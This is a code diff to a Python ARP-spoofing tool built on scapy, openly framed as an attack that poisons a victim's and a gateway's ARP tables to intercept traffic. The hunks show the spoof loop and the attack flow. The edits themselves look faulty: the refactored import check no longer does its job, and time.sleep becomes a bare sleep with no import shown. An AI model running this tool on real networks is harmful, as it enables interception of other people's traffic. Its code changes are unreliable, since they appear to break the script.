@@ -7,7 +7,7 @@ Automatically restores ARP tables on exit (Ctrl+C).
 
 Requires:
     - Python 3
-    - scapy  (pip install scapy --break-system-packages)
+    - scapy
     - Root 
     - Linux only
 """
@@ -17,15 +17,17 @@ import sys
 import time
 import threading
 
-try:
-    from scapy.all import ARP, Ether, srp, send, conf
-    conf.verb = 0  # suppress scapy's own output
-except ImportError as e:
-    print(f"[!] scapy is not installed. {e}")
-    print("[!] Install it using the requirements.txt")
-    sys.exit()
+def system_check():
+    try:
+        from scapy.all import ARP, Ether, srp, send, conf
+        conf.verb = 0  # suppress scapy's own output
+    except ImportError as e:
+        print(f"[!] scapy is not installed. {e}")
+        print("[!] Install it using the requirements.txt")
+        return
+system_check()
 
-
+from scapy.all import ARP, Ether, srp, send, conf
 # ── Core ARP functions ────────────────────────────────────────────────────────
 
 def get_mac(ip):
@@ -127,7 +129,7 @@ def spoof_loop(victim_ip, gateway_ip, victim_mac, gateway_mac):
         spoof(victim_ip, gateway_ip, victim_mac)    # poison victim
         spoof(gateway_ip, victim_ip, gateway_mac)   # poison gateway
         packet_count += 2
-        time.sleep(2)
+        sleep(2)
 
 
 def status_loop(victim_ip, gateway_ip):
@@ -139,7 +141,7 @@ def status_loop(victim_ip, gateway_ip):
             f"Packets sent: {packet_count}",
             end=""
         )
-        time.sleep(1)
+        sleep(1)
 
 
 # ── Main attack flow ──────────────────────────────────────────────────────────
@@ -184,7 +186,7 @@ def run_attack(victim_ip, gateway_ip):
         pass
     finally:
         running = False
-        time.sleep(1)   # let threads finish their last iteration
+        sleep(1)   # let threads finish their last iteration
 
         print("\n\n[!] Stopping attack — restoring ARP tables...")
         restore(victim_ip,  gateway_ip, victim_mac,  gateway_mac)
